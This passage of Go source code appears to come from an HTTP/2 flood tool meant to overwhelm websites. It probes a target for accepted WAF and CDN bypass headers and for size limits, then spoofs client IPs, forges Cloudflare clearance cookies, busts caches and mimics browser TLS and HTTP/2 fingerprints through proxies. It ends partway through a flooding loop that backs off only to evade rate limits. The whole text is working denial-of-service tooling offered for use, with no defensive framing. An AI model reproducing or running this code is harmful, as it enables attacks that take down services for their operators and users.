	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	switch name {
	case "X-Original-URL", "X-Rewrite-URL":
		return "/" + randStr(8)
	case "X-Forwarded-Host", "X-Proxy-Host", "X-Host", "X-Original-Host", "X-Host-Override":
		return host
	case "X-Request-ID":
		return strconv.FormatInt(mrand.Int63(), 16)
	case "CDN-Loop":
		return "cloudflare"
	case "CF-Connecting-IP", "True-Client-IP", "Fastly-Client-IP", "X-Real-IP",
		"X-Originating-IP", "X-Client-IP":
		if proxyIP != "" {
			return proxyIP
		}
		return generateLegitIP()
	case "X-Forwarded-Proto", "X-Forwarded-Scheme", "CloudFront-Forwarded-Proto":
		return "https"
	case "X-Cache":
		return "BYPASS"
	case "X-Requested-With":
		return "XMLHttpRequest"
	case "X-HTTP-Method-Override", "X-Method-Override":
		return "GET"
	case "X-Sucuri-ID":
		return "sucuri-" + randStr(8)
	case "X-Akamai-Transformed":
		return "1"
	case "X-CDN":
		return "Imperva"
	default:
		return "test"
	}
}

func probeBypassHeaders(target, proxyIP, proxyURL string, headers []string) map[string]bool {
	result := make(map[string]bool)
	for _, h := range headers {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set(h, buildBypassValue(h, target, proxyIP))
		resp, err := doProbe(target, proxyURL, req) // FIX C3
		if err != nil {
			result[h] = false
			continue
		}
		resp.Body.Close()
		result[h] = resp.StatusCode >= 200 && resp.StatusCode < 400
	}
	return result
}

// ============================================================================
// LIMIT PROBE
// ============================================================================

func probeMaxURLLength(target, proxyURL string) int {
	low, high := 1000, 2000
	for {
		u := target
		if strings.Contains(u, "?") {
			u += "&x=" + strings.Repeat("A", high)
		} else {
			u += "?x=" + strings.Repeat("A", high)
		}
		req, _ := http.NewRequest("GET", u, nil)
		resp, err := doProbe(target, proxyURL, req) // FIX C3
		if err != nil || resp.StatusCode >= 400 {
			break
		}
		resp.Body.Close()
		low = high
		high *= 2
		if high > 200000 {
			break
		}
	}
	lastOK := low
	for low <= high {
		mid := (low + high) / 2
		u := target
		if strings.Contains(u, "?") {
			u += "&x=" + strings.Repeat("A", mid)
		} else {
			u += "?x=" + strings.Repeat("A", mid)
		}
		req, _ := http.NewRequest("GET", u, nil)
		resp, err := doProbe(target, proxyURL, req) // FIX C3
		if err != nil {
			high = mid - 1
			continue
		}
		if resp.StatusCode < 400 {
			lastOK = mid
			low = mid + 1
		} else {
			high = mid - 1
		}
		resp.Body.Close()
	}
	return lastOK
}

func probeMaxHeaderSize(target, proxyURL string) int {
	low, high := 512, 1024
	for {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("X-Large-Data", strings.Repeat("A", high))
		resp, err := doProbe(target, proxyURL, req) // FIX C3
		if err != nil || resp.StatusCode == 431 || resp.StatusCode == 400 || resp.StatusCode == 413 {
			break
		}
		resp.Body.Close()
		low = high
		high *= 2
		if high > 100000 {
			break
		}
	}
	lastOK := low
	for low <= high {
		mid := (low + high) / 2
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("X-Large-Data", strings.Repeat("A", mid))
		resp, err := doProbe(target, proxyURL, req) // FIX C3
		if err != nil {
			high = mid - 1
			continue
		}
		if resp.StatusCode < 400 {
			lastOK = mid
			low = mid + 1
		} else {
			high = mid - 1
		}
		resp.Body.Close()
	}
	return lastOK
}

func probeMaxHeaderCount(target, proxyURL string) int {
	low, high := 10, 20
	for {
		req, _ := http.NewRequest("GET", target, nil)
		for i := 0; i < high; i++ {
			req.Header.Set(fmt.Sprintf("X-Hdr-%d", i), "v")
		}
		resp, err := doProbe(target, proxyURL, req) // FIX C3
		if err != nil || resp.StatusCode == 431 || resp.StatusCode == 400 {
			break
		}
		resp.Body.Close()
		low = high
		high *= 2
		if high > 500 {
			break
		}
	}
	lastOK := low
	for low <= high {
		mid := (low + high) / 2
		req, _ := http.NewRequest("GET", target, nil)
		for i := 0; i < mid; i++ {
			req.Header.Set(fmt.Sprintf("X-Hdr-%d", i), "v")
		}
		resp, err := doProbe(target, proxyURL, req) // FIX C3
		if err != nil {
			high = mid - 1
			continue
		}
		if resp.StatusCode < 400 {
			lastOK = mid
			low = mid + 1
		} else {
			high = mid - 1
		}
		resp.Body.Close()
	}
	return lastOK
}

func probeMaxCookieSize(target, proxyURL string) int {
	low, high := 512, 1024
	for {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("Cookie", "a="+strings.Repeat("A", high))
		resp, err := doProbe(target, proxyURL, req) // FIX C3
		if err != nil || resp.StatusCode == 431 || resp.StatusCode == 400 || resp.StatusCode == 413 {
			break
		}
		resp.Body.Close()
		low = high
		high *= 2
		if high > 50000 {
			break
		}
	}
	lastOK := low
	for low <= high {
		mid := (low + high) / 2
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("Cookie", "a="+strings.Repeat("A", mid))
		resp, err := doProbe(target, proxyURL, req) // FIX C3
		if err != nil {
			high = mid - 1
			continue
		}
		if resp.StatusCode < 400 {
			lastOK = mid
			low = mid + 1
		} else {
			high = mid - 1
		}
		resp.Body.Close()
	}
	return lastOK
}

func probeMaxBodySize(target, proxyURL string) int {
	low, high := 1024, 2048
	for {
		body := strings.NewReader(strings.Repeat("B", high))
		req, _ := http.NewRequest("POST", target, body)
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		resp, err := doProbe(target, proxyURL, req) // FIX C3
		if err != nil || resp.StatusCode == 413 || resp.StatusCode == 400 {
			break
		}
		resp.Body.Close()
		low = high
		high *= 2
		if high > 1000000 {
			break
		}
	}
	lastOK := low
	for low <= high {
		mid := (low + high) / 2
		body := strings.NewReader(strings.Repeat("B", mid))
		req, _ := http.NewRequest("POST", target, body)
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		resp, err := doProbe(target, proxyURL, req) // FIX C3
		if err != nil {
			high = mid - 1
			continue
		}
		if resp.StatusCode < 400 {
			lastOK = mid
			low = mid + 1
		} else {
			high = mid - 1
		}
		resp.Body.Close()
	}
	return lastOK
}

// ============================================================================
// VALID VALUE PROBE
// ============================================================================

func probeValidOrigins(target, proxyURL string) []string {
	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	candidates := []string{
		"https://" + host,
		"https://www.google.com",
		"https://www.bing.com",
		"https://www.yahoo.com",
		"",
	}
	valid := []string{}
	for _, o := range candidates {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		if o != "" {
			req.Header.Set("Origin", o)
		}
		resp, err := doProbe(target, proxyURL, req) // FIX C3
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, o)
		}
	}
	if len(valid) == 0 {
		valid = []string{"https://" + host}
	}
	return valid
}

func probeValidReferers(target, proxyURL string) []string {
	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	candidates := []string{
		"https://" + host + "/",
		"https://www.google.com/search?q=" + host,
		"https://www.bing.com/search?q=" + host,
		"https://www.yahoo.com/search?p=" + host,
		"",
	}
	valid := []string{}
	for _, r := range candidates {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		if r != "" {
			req.Header.Set("Referer", r)
		}
		resp, err := doProbe(target, proxyURL, req) // FIX C3
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, r)
		}
	}
	if len(valid) == 0 {
		valid = []string{"https://" + host + "/"}
	}
	return valid
}

func probeValidUAs(target, proxyURL string) []string {
	testUAs := []string{
		chromeUAs[0], firefoxUAs[0], edgeUAs[0], safariUAs[0],
	}
	valid := []string{}
	for _, ua := range testUAs {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", ua)
		resp, err := doProbe(target, proxyURL, req) // FIX C3
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, ua)
		}
	}
	if len(valid) == 0 {
		valid = testUAs
	}
	return valid
}

func probeValidMethods(target, proxyURL string) []string {
	methods := []string{"GET", "POST", "OPTIONS", "HEAD"}
	valid := []string{}
	for _, m := range methods {
		req, _ := http.NewRequest(m, target, nil)
		if m == "POST" {
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			req.Body = io.NopCloser(strings.NewReader(""))
		}
		req.Header.Set("User-Agent", "Mozilla/5.0")
		resp, err := doProbe(target, proxyURL, req) // FIX C3
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, m)
		}
	}
	if len(valid) == 0 {
		valid = []string{"GET"}
	}
	return valid
}

func probeValidEncodings(target, proxyURL string) []string {
	encs := []string{"gzip, deflate, br", "gzip, deflate", "gzip", "br", "identity"}
	valid := []string{}
	for _, e := range encs {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("Accept-Encoding", e)
		resp, err := doProbe(target, proxyURL, req) // FIX C3
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, e)
		}
	}
	if len(valid) == 0 {
		valid = []string{"gzip, deflate, br"}
	}
	return valid
}

func probeValidCacheControls(target, proxyURL string) []string {
	controls := []string{"no-cache", "no-store", "max-age=0", "must-revalidate"}
	valid := []string{}
	for _, c := range controls {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("Cache-Control", c)
		resp, err := doProbe(target, proxyURL, req) // FIX C3
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, c)
		}
	}
	if len(valid) == 0 {
		valid = []string{"no-cache"}
	}
	return valid
}

// ============================================================================
// HEADER CONSISTENCY
// ============================================================================

func deriveSecFetch(origin, referer, host string) (site, mode, dest string) {
	if origin == "" && referer == "" {
		return "none", "navigate", "document"
	}
	if origin != "" && strings.Contains(origin, host) {
		return "same-origin", "navigate", "document"
	}
	if referer != "" && strings.Contains(referer, host) {
		return "same-origin", "navigate", "document"
	}
	return "cross-site", "navigate", "document"
}

func validateHeaderConsistency(hdrs map[string]string, fp Fingerprint, host string) {
	switch fp.Browser {
	case "chrome", "edge":
		delete(hdrs, "te")
		ver := uaChromeVersion(fp.UA)
		if _, ok := hdrs["sec-ch-ua"]; !ok {
			brand := "Google Chrome"
			if fp.Browser == "edge" {
				brand = "Microsoft Edge"
			}
			hdrs["sec-ch-ua"] = fmt.Sprintf(`"Not_A Brand";v="8", "Chromium";v="%d", "%s";v="%d"`, ver, brand, ver)
		}
	case "firefox":
		delete(hdrs, "sec-ch-ua")
		delete(hdrs, "sec-ch-ua-mobile")
		delete(hdrs, "sec-ch-ua-platform")
		delete(hdrs, "sec-ch-viewport-width")
		delete(hdrs, "sec-ch-device-memory")
		delete(hdrs, "sec-ch-dpr")
		hdrs["te"] = "trailers"
	case "safari":
		delete(hdrs, "sec-ch-ua")
		delete(hdrs, "sec-ch-ua-mobile")
		delete(hdrs, "sec-ch-ua-platform")
		delete(hdrs, "sec-fetch-user")
		delete(hdrs, "priority")
	}

	site, mode, dest := deriveSecFetch(hdrs["origin"], hdrs["referer"], host)
	hdrs["sec-fetch-site"] = site
	hdrs["sec-fetch-mode"] = mode
	hdrs["sec-fetch-dest"] = dest
}

// ============================================================================
// HEADER ORDER
// ============================================================================

var headerOrderChrome = []string{
	"sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
	"upgrade-insecure-requests", "user-agent", "accept",
	"sec-fetch-site", "sec-fetch-mode", "sec-fetch-user", "sec-fetch-dest",
	"referer", "accept-encoding", "accept-language",
	"sec-ch-viewport-width", "sec-ch-device-memory", "sec-ch-dpr",
	"priority", "origin", "cookie",
}

var headerOrderFirefox = []string{
	"user-agent", "accept", "accept-language", "accept-encoding",
	"referer", "origin", "upgrade-insecure-requests",
	"sec-fetch-dest", "sec-fetch-mode", "sec-fetch-site", "sec-fetch-user",
	"te", "priority", "cookie",
}

var headerOrderSafari = []string{
	"accept", "sec-fetch-site", "sec-fetch-mode", "sec-fetch-dest",
	"user-agent", "accept-language", "accept-encoding",
	"referer", "origin", "priority", "cookie",
}

func headerOrderFor(browser string) []string {
	switch browser {
	case "firefox":
		return headerOrderFirefox
	case "safari":
		return headerOrderSafari
	default:
		return headerOrderChrome
	}
}

func pseudoOrderFor(browser string) []string {
	switch browser {
	case "firefox", "safari":
		return []string{":method", ":path", ":authority", ":scheme"}
	default:
		return []string{":method", ":authority", ":scheme", ":path"}
	}
}

// ============================================================================
// IP SPOOF HEADERS
// ============================================================================

func ipSpoofHeaders() map[string]string {
	h := map[string]string{}
	if randFloat() < 0.5 {
		h["cdn-loop"] = generateLegitIP() + ":" + randStr(5)
	}
	if randFloat() < 0.4 {
		h["true-client-ip"] = generateLegitIP()
	}
	if randFloat() < 0.5 {
		h["via"] = "1.1 " + generateLegitIP()
	}
	if randFloat() < 0.6 {
		h["request-context"] = "appId=" + randStr(8) + ";ip=" + generateLegitIP()
	}
	if randFloat() < 0.4 {
		h["x-edge-ip"] = generateLegitIP()
	}
	if randFloat() < 0.3 {
		h["x-coming-from"] = generateLegitIP()
	}
	if randFloat() < 0.4 {
		h["akamai-client-ip"] = generateLegitIP()
	}
	if len(h) == 0 {
		h["cdn-loop"] = generateLegitIP() + ":" + randStr(5)
	}
	return h
}

// ============================================================================
// CACHE BYPASS
// ============================================================================

func cacheBypassHeaders() map[string]string {
	return map[string]string{
		"cache-control":  pick(cacheControlVariants),
		"pragma":         "no-cache",
		"expires":        "0",
		"x-cache-buster": randStr(10),
	}
}

func cacheBypassQuery(rawPath string) string {
	ts := time.Now().UnixMilli()
	paramNames := []string{"_", "t", "ts", "time", "timestamp", "cache", "cb", "v", "rnd", "nocache"}
	parts := []string{fmt.Sprintf("%s=%d", pick(paramNames), ts)}
	for i := 0; i < randInt(2, 4); i++ {
		parts = append(parts, randLower(4)+"="+randStr(6))
	}
	sep := "?"
	if strings.Contains(rawPath, "?") {
		sep = "&"
	}
	return sep + strings.Join(parts, "&")
}

func clickIDParams() string {
	var liFatID int64
	if n, err := rand.Int(rand.Reader, big.NewInt(1e16)); err == nil && n != nil {
		liFatID = n.Int64()
	} else {
		liFatID = int64(mrand.Intn(1_000_000_000))
	}
	gclid := "Cj" + randStr(28) + randHex(4)
	msclkid := randHex(16)
	twclid := randStr(24) + randHex(6)
	epik := randStr(32) + "_" + strconv.FormatInt(time.Now().UnixMilli(), 10)
	return fmt.Sprintf("&gclid=%s&msclkid=%s&twclid=%s&li_fat_id=%d&epik=%s",
		gclid, msclkid, twclid, liFatID, epik)
}

func randomPath() string {
	prefix := pick(randomPathPrefixes)
	ext := pick(pathExtensions)
	if prefix == "" {
		return "/" + randLower(5) + ext
	}
	if randFloat() > 0.5 {
		return "/" + prefix + "/" + randLower(3) + ext
	}
	return "/" + prefix + ext
}

func buildRawPath(cfg *Config, parsed *url.URL) string {
	path := parsed.Path
	if path == "" {
		path = "/"
	}
	if parsed.RawQuery != "" {
		path += "?" + parsed.RawQuery
	}
	if cfg.ForceRandPath {
		path = randomPath()
	}
	if cfg.UseQuery {
		cleanPath := path
		if idx := strings.IndexByte(cleanPath, '?'); idx >= 0 {
			cleanPath = cleanPath[:idx]
		}
		path = cleanPath + cacheBypassQuery(cleanPath) + clickIDParams()
	}
	// Limit-aware padding
	if cfg.Limits.MaxURL > 0 && mrand.Intn(3) == 0 {
		size := cfg.Limits.MaxURL * (80 + mrand.Intn(40)) / 100
		if size > 0 {
			sep := "&"
			if !strings.Contains(path, "?") {
				sep = "?"
			}
			path += sep + "big=" + strings.Repeat("x", size)
		}
	}
	return path
}

// ============================================================================
// H2 HEADER BUILDER
// ============================================================================

func buildH2HeaderList(cfg *Config, ps *ProxyState, parsed *url.URL, path string) []hpack.HeaderField {
	ps.fpMu.RLock()
	fp := ps.fp
	ps.fpMu.RUnlock()

	hdrs := map[string]string{
		":method":    "GET",
		":authority": parsed.Host,
		":scheme":    parsed.Scheme,
		":path":      path,
	}

	hdrs["accept"] = pick(acceptHeaders)
	hdrs["accept-encoding"] = pick(encodingHeaders)
	hdrs["accept-language"] = fp.AcceptLang

	if randFloat() < 0.15 {
		hdrs["user-agent"] = pick(botUAs)
	} else {
		hdrs["user-agent"] = fp.UA
	}

	if fp.Browser == "chrome" || fp.Browser == "edge" {
		ver := uaChromeVersion(fp.UA)
		brand := "Google Chrome"
		if fp.Browser == "edge" {
			brand = "Microsoft Edge"
		}
		hdrs["sec-ch-ua"] = fmt.Sprintf(`"Not_A Brand";v="8", "Chromium";v="%d", "%s";v="%d"`, ver, brand, ver)
		hdrs["sec-ch-ua-mobile"] = "?0"
		hdrs["sec-ch-ua-platform"] = pick([]string{`"Windows"`, `"macOS"`, `"Linux"`})
		hdrs["sec-ch-viewport-width"] = strconv.Itoa(fp.ViewportW)
		hdrs["sec-ch-device-memory"] = fp.DeviceMem
		hdrs["sec-ch-dpr"] = fp.DPR
	}

	if fp.Browser == "firefox" {
		hdrs["te"] = "trailers"
	}

	if randFloat() < 0.5 {
		hdrs["upgrade-insecure-requests"] = "1"
	}
	if randFloat() < 0.5 {
		hdrs["priority"] = "u=0, i"
	}

	// Session-driven origin/referer — FIX C2: gọi NextReferer trong lock
	ps.sessionMu.Lock()
	origin := ps.session.Origin
	referer := ps.session.NextReferer()
	ps.sessionMu.Unlock()
	if randFloat() < 0.4 {
		origin = pick(cfg.Origins)
	}
	if randFloat() < 0.4 {
		referer = pick(cfg.Referers)
	}
	if origin != "" {
		hdrs["origin"] = origin
	}
	if referer != "" {
		hdrs["referer"] = referer
	}

	// Cookie jar với host filter
	if cfg.UseBFM && !ps.jar.Has("cf_clearance") {
		ps.jar.SeedFromString(generateBFMCookies(), parsed.Hostname())
	}
	if ck := ps.getCookie(parsed.Hostname()); ck != "" {
		hdrs["cookie"] = ck
	}

	if cfg.UseCache {
		for k, v := range cacheBypassHeaders() {
			hdrs[k] = v
		}
	}

	if cfg.UseIPSpoof {
		for k, v := range ipSpoofHeaders() {
			hdrs[k] = v
		}
	}

	// Apply probed bypass headers
	for h, ok := range cfg.Supported {
		if !ok {
			continue
		}
		if randFloat() < 0.3 {
			hdrs[strings.ToLower(h)] = buildBypassValue(h, cfg.Target, "")
		}
	}

	// Limit-aware header padding
	if cfg.Limits.MaxHeaderCount > 0 && mrand.Intn(2) == 0 {
		count := cfg.Limits.MaxHeaderCount * (80 + mrand.Intn(40)) / 100
		if count > 0 && count < 200 {
			for j := 0; j < count; j++ {
				hdrs[fmt.Sprintf("x-ex-%d", j)] = "v"
			}
		}
	}
	if cfg.Limits.MaxHeaderSize > 0 && mrand.Intn(2) == 0 {
		size := cfg.Limits.MaxHeaderSize * (80 + mrand.Intn(40)) / 100
		if size > 0 && size < 20000 {
			hdrs["x-large-data"] = strings.Repeat("x", size)
		}
	}
	if cfg.Limits.MaxCookieSize > 0 && mrand.Intn(3) == 0 {
		size := cfg.Limits.MaxCookieSize * (80 + mrand.Intn(40)) / 100
		if size > 0 && size < 20000 {
			pad := "a=" + strings.Repeat("A", size)
			if ck, ok := hdrs["cookie"]; ok {
				hdrs["cookie"] = ck + "; " + pad
			} else {
				hdrs["cookie"] = pad
			}
		}
	}

	// Consistency check
	validateHeaderConsistency(hdrs, fp, parsed.Hostname())

	// Build theo thứ tự browser
	out := make([]hpack.HeaderField, 0, len(hdrs)+4)
	for _, k := range pseudoOrderFor(fp.Browser) {
		if v, ok := hdrs[k]; ok {
			out = append(out, hpack.HeaderField{Name: k, Value: v})
			delete(hdrs, k)
		}
	}
	for _, k := range headerOrderFor(fp.Browser) {
		if v, ok := hdrs[k]; ok {
			out = append(out, hpack.HeaderField{Name: k, Value: v})
			delete(hdrs, k)
		}
	}
	rest := make([]string, 0, len(hdrs))
	for k := range hdrs {
		rest = append(rest, k)
	}
	sort.Strings(rest)
	for _, k := range rest {
		out = append(out, hpack.HeaderField{Name: k, Value: hdrs[k]})
	}
	return out
}

// ============================================================================
// RAW H2 CONNECTION
// ============================================================================

type RawH2Conn struct {
	conn     net.Conn
	framer   *http2.Framer
	hpackEnc *hpack.Encoder
	hpackBuf *bytes.Buffer
}

func dialProxyTLS(proxyURL string, target *url.URL, helloID utls.ClientHelloID, alpn []string) (net.Conn, string, error) {
	pu, err := url.Parse(proxyURL)
	if err != nil {
		return nil, "", err
	}

	pc, err := net.DialTimeout("tcp", pu.Host, dialTimeout)
	if err != nil {
		return nil, "", err
	}

	req := fmt.Sprintf("CONNECT %s:443 HTTP/1.1\r\nHost: %s:443\r\nProxy-Connection: Keep-Alive\r\n",
		target.Hostname(), target.Hostname())
	if pu.User != nil {
		user := pu.User.Username()
		pass, _ := pu.User.Password()
		auth := base64.StdEncoding.EncodeToString([]byte(user + ":" + pass))
		req += fmt.Sprintf("Proxy-Authorization: Basic %s\r\n", auth)
	}
	req += "\r\n"

	if _, err := pc.Write([]byte(req)); err != nil {
		pc.Close()
		return nil, "", err
	}

	buf := make([]byte, 4096)
	n, err := pc.Read(buf)
	if err != nil {
		pc.Close()
		return nil, "", err
	}
	if !bytes.Contains(buf[:n], []byte("200")) {
		pc.Close()
		return nil, "", fmt.Errorf("proxy connect failed")
	}

	tlsCfg := &utls.Config{ // [COMPAT-SHIM] utls.Config instead of tls.Config
		ServerName:         target.Hostname(),
		InsecureSkipVerify: true,
		NextProtos:         alpn,
		MinVersion:         tls.VersionTLS12,
		MaxVersion:         tls.VersionTLS13,
	}

	uconn := utls.UClient(pc, tlsCfg, helloID, false, false, false) // [COMPAT-SHIM] 6-arg UClient
	if err := uconn.Handshake(); err != nil {
		pc.Close()
		return nil, "", err
	}

	return uconn, uconn.ConnectionState().NegotiatedProtocol, nil
}

func NewRawH2Conn(proxyURL string, target *url.URL, helloID utls.ClientHelloID) (*RawH2Conn, error) {
	conn, alpn, err := dialProxyTLS(proxyURL, target, helloID, []string{"h2", "http/1.1"})
	if err != nil {
		return nil, err
	}

	if alpn != "h2" {
		conn.Close()
		return nil, fmt.Errorf("alpn=%s", alpn)
	}

	framer := http2.NewFramer(conn, conn)
	framer.ReadMetaHeaders = hpack.NewDecoder(4096, nil)

	hbuf := new(bytes.Buffer)
	enc := hpack.NewEncoder(hbuf)

	if _, err := conn.Write([]byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")); err != nil {
		conn.Close()
		return nil, err
	}

	return &RawH2Conn{conn: conn, framer: framer, hpackEnc: enc, hpackBuf: hbuf}, nil
}

func (r *RawH2Conn) WriteSettings(s []http2.Setting) error { return r.framer.WriteSettings(s...) }
func (r *RawH2Conn) WriteSettingsAck() error               { return r.framer.WriteSettingsAck() }
func (r *RawH2Conn) WriteWindowUpdate(id, inc uint32) error {
	return r.framer.WriteWindowUpdate(id, inc)
}
func (r *RawH2Conn) WriteHeadersFrame(id uint32, block []byte, end bool, prio *http2.PriorityParam) error {
	return r.framer.WriteHeaders(http2.HeadersFrameParam{
		StreamID: id, BlockFragment: block, EndStream: end, EndHeaders: true, Priority: *prio, // [COMPAT-SHIM] PriorityParam is a value
	})
}
func (r *RawH2Conn) WritePing(ack bool, data [8]byte) error { return r.framer.WritePing(ack, data) }
func (r *RawH2Conn) WriteRSTStream(id uint32, code http2.ErrCode) error {
	return r.framer.WriteRSTStream(id, code)
}
func (r *RawH2Conn) WritePriority(id uint32, p http2.PriorityParam) error {
	return r.framer.WritePriority(id, p)
}
func (r *RawH2Conn) ReadFrame() (http2.Frame, error) { return r.framer.ReadFrame() }
func (r *RawH2Conn) Close() error                    { return r.conn.Close() }

func (r *RawH2Conn) EncodeHeaders(fields []hpack.HeaderField) []byte {
	r.hpackBuf.Reset()
	for _, h := range fields {
		_ = r.hpackEnc.WriteField(h)
	}
	out := make([]byte, r.hpackBuf.Len())
	copy(out, r.hpackBuf.Bytes())
	return out
}

func chromeSettings() []http2.Setting {
	return []http2.Setting{
		{ID: http2.SettingHeaderTableSize, Val: 65536},
		{ID: http2.SettingEnablePush, Val: 0},
		{ID: http2.SettingInitialWindowSize, Val: 6291456},
		{ID: http2.SettingMaxHeaderListSize, Val: 262144},
	}
}

func firefoxSettings() []http2.Setting {
	return []http2.Setting{
		{ID: http2.SettingHeaderTableSize, Val: 65536},
		{ID: http2.SettingEnablePush, Val: 0},
		{ID: http2.SettingInitialWindowSize, Val: 131072},
		{ID: http2.SettingMaxHeaderListSize, Val: 65536},
	}
}

func safariSettings() []http2.Setting {
	return []http2.Setting{
		{ID: http2.SettingHeaderTableSize, Val: 4096},
		{ID: http2.SettingEnablePush, Val: 0},
		{ID: http2.SettingInitialWindowSize, Val: 1048576},
		{ID: http2.SettingMaxHeaderListSize, Val: 262144},
	}
}

func settingsFor(browser string) []http2.Setting {
	switch browser {
	case "firefox":
		return firefoxSettings()
	case "safari":
		return safariSettings()
	default:
		return chromeSettings()
	}
}

func defaultPriority() *http2.PriorityParam {
	return &http2.PriorityParam{StreamDep: 0, Exclusive: true, Weight: 255} // [COMPAT-SHIM] uint8 max
}

func injectRandomFrame(raw *RawH2Conn) {
	if randFloat() > 0.02 {
		return
	}
	switch mrand.Intn(3) {
	case 0:
		_ = raw.WriteSettings([]http2.Setting{
			{ID: http2.SettingInitialWindowSize, Val: uint32(randInt(6000000, 12000000))},
		})
	case 1:
		_ = raw.WriteWindowUpdate(0, uint32(randInt(2000000, 8000000)))
	case 2:
		_ = raw.WritePriority(uint32(randInt(1, 1000))*2+1,
			http2.PriorityParam{StreamDep: 0, Exclusive: true, Weight: 255}) // [COMPAT-SHIM] uint8 max
	}
}

// ============================================================================
// STATS
// ============================================================================

type Stats struct {
	total  atomic.Uint64
	byCode sync.Map
}

func (s *Stats) record(code int) {
	s.total.Add(1)
	v, _ := s.byCode.LoadOrStore(code, new(atomic.Uint64))
	v.(*atomic.Uint64).Add(1)
}

func (s *Stats) dump(reset bool) (string, uint64) {
	parts := []string{}
	var total uint64
	s.byCode.Range(func(k, v interface{}) bool {
		c := v.(*atomic.Uint64)
		n := c.Load()
		if n > 0 {
			parts = append(parts, fmt.Sprintf("%d:%d", k.(int), n))
			total += n
		}
		if reset {
			c.Store(0)
		}
		return true
	})
	return strings.Join(parts, " "), total
}

var globalStats = &Stats{}

var connSem = make(chan struct{}, maxConns)

func acquireConn(ctx context.Context) bool {
	select {
	case connSem <- struct{}{}:
		return true
	case <-ctx.Done():
		return false
	case <-time.After(2 * time.Second):
		return false
	}
}

func releaseConn() {
	select {
	case <-connSem:
	default:
	}
}

func randomDelay() time.Duration {
	base := 80 + mrand.Intn(70)
	jitter := mrand.Intn(50) - 25
	d := base + jitter
	if d < 20 {
		d = 20
	}
	return time.Duration(d) * time.Millisecond
}

func handleStatus(cfg *Config, ps *ProxyState, status int, setCookie []string, retryAfter time.Duration, host string) {
	globalStats.record(status)
	ps.recordStatus(status)

	if len(setCookie) > 0 {
		ps.updateCookie(setCookie, host)
	}

	switch status {
	case 429:
		if cfg.RateLimit {
			ps.mark429()
			strat := pickBackoff(allBackoffStrategies)
			delay := computeBackoffDelay(strat, 1, retryAfter)
			ps.applyBackoffDelay(delay)
			ps.recordBackoff()
		}
	case 403:
		if cfg.RateLimit {
			ps.mark403()
		}
	}
}

// ============================================================================
// FLOODERS
// ============================================================================

func rawH2Flooder(ctx context.Context, cfg *Config, parsed *url.URL, ps *ProxyState, connID int) {
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}

		if ps.isBlocked() || ps.isBackedOff() {
			select {
			case <-ctx.Done():
				return
			case <-time.After(200 * time.Millisecond):
			}
			continue
		}

		if !acquireConn(ctx) {
			continue
		}

		ps.fpMu.RLock()
		helloID := ps.fp.ClientHelloID
		browser := ps.Browser
		ps.fpMu.RUnlock()

		raw, err := NewRawH2Conn(ps.URL, parsed, helloID)
		if err != nil {
			releaseConn()
			select {
			case <-ctx.Done():
				return
			case <-time.After(1 * time.Second):
			}
			continue
		}

		if err := raw.WriteSettings(settingsFor(browser)); err != nil {
			raw.Close()
			releaseConn()
			continue
		}
		if err := raw.WriteWindowUpdate(0, 15663105); err != nil {
			raw.Close()
			releaseConn()
			continue
		}

		readDone := make(chan struct{})
		go func() {
			defer close(readDone)
			for {
				frame, err := raw.ReadFrame()
				if err != nil {
					return
				}
				switch f := frame.(type) {
				case *http2.SettingsFrame:
					if !f.IsAck() {
						_ = raw.WriteSettingsAck()
					}
				case *http2.PingFrame:
					if !f.IsAck() {
						_ = raw.WritePing(true, f.Data)
					}
				case *http2.MetaHeadersFrame:
					var status int
					var setCookie []string
					var retryAfter time.Duration
					for _, hf := range f.Fields {
						switch hf.Name {
						case ":status":
							if v, err := strconv.Atoi(hf.Value); err == nil {
								status = v
							}
						case "set-cookie":
							setCookie = append(setCookie, hf.Value)
						case "retry-after":
							retryAfter = parseRetryAfter(hf.Value)
						}
					}
					if status > 0 {
						handleStatus(cfg, ps, status, setCookie, retryAfter, parsed.Hostname())
					}
				case *http2.GoAwayFrame:
					if cfg.RateLimit {
						strat := pickBackoff(allBackoffStrategies)
						delay := computeBackoffDelay(strat, 1, 0)
						ps.applyBackoffDelay(delay)
						ps.recordBackoff()
					}
					return
				}
			}
		}()

		streamID := uint32(1)
		errs := 0

	floodLoop:
		for {
			select {
			case <-ctx.Done():
				raw.Close()
				<-readDone
				releaseConn()
				return
			default:
			}

			if ps.isBlocked() || ps.isBackedOff() {
				// FIX C4: đóng conn + release trước khi break để không giữ slot connSem
				raw.Close()
				<-readDone
				releaseConn()
				break floodLoop
			}

			// Session evolve
			ps.sessionMu.Lock()
